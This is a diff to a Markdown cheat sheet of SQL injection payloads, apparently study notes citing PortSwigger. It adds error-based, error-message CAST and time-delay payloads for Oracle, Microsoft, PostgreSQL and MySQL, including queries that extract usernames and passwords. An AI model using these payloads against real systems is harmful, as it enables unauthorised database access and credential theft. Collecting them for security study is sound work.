@@ -45,9 +45,28 @@ Valor en ASCII: ```xyz' AND ASCII(SUBSTRING((SELECT Password FROM Users WHERE Us
 
 Del 32-126
 
-Error-based SQL injection (ORACLE): ``` xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 1 END)=1--```
+## Error-based
 
-Error-based SQL injection (ORACLE): ``` xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 1 END FROM DUAL)=1--```
+Non-ORACLE: ``` xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 1 END)=1--```
+
+ORACLE: ``` xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 1 END FROM DUAL)=1--```
+
+## Message Error
+
+```
+ CAST((SELECT example_column FROM example_table) AS int) 
+' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
+```
+
+## Time delays
+Oracle:	dbms_pipe.receive_message(('a'),10)
+
+Microsoft:	WAITFOR DELAY '0:0:10'
+
+PostgreSQL:	SELECT pg_sleep(10) ``` '||(SELECT pg_sleep(10) WHERE (1=1))--```
+
+MySQL:	SELECT SLEEP(10)
+
 
 # Referencias
 - [Burpsuite](https://portswigger.net/web-security/sql-injection/cheat-sheet)
